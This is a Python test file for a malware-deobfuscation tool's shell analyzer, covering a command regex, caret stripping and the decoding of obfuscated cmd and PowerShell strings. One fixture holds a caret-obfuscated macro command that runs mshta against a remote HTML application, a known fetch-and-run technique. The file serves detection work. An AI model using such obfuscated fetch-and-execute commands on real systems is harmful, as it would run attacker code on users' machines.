import regex as re

from multidecoder.analyzers.shell import CMD_RE, find_cmd_strings, find_powershell_strings, strip_carets
from multidecoder.hit import Hit

test = b'SET.NAME(a , cmd /c m^sh^t^a h^tt^p^:/^/some.url/x.html)'


def test_cmd_re_empty():
    assert not re.search(CMD_RE, b'')


def test_cmd_re_command():
    assert re.match(CMD_RE, b'cmd command')


def test_cmd_re_mixed_case():
    assert re.match(CMD_RE, b'CmD CoMMaNd')


def test_cmd_re_carets():
    assert re.match(CMD_RE, b'c^m^d c^omman^d')


def test_cmd_re_quotes():
    assert re.match(CMD_RE, b'cmd /c ""echo bee""')


def test_cmd_re_ex1():
    match = re.search(CMD_RE, test)
    assert match and test[match.start(): match.end()] == b'cmd /c m^sh^t^a h^tt^p^:/^/some.url/x.html'


def test_strip_carets_empty():
    assert strip_carets(b'') == b''


def test_strip_carets_no_caret():
    assert strip_carets(b'test') == b'test'


def test_strip_carets_caret():
    assert strip_carets(b'^') == b''


def test_strip_carets_escape_caret():
    assert strip_carets(b'^^') == b'^'


def test_strip_carets_trailing_caret():
    assert strip_carets(b'test^') == b'test'


def test_find_cmd_strings():
    assert find_cmd_strings(test) == [
        Hit(value=b'cmd /c mshta http://some.url/x.html',
            start=13,
            end=55,
            obfuscation='unescape.shell.carets')
    ]


def test_find_poweshell_strings():
    ex = b'"powershell /e ZQBj^AGgAbwAgAGIAZQ^BlAA=="'
    assert find_powershell_strings(ex) == [
        Hit(value=b'powershell echo bee',
            obfuscation='unescape.shell.carets/>powershell.base64',
            start=0,
            end=len(ex))
    ]
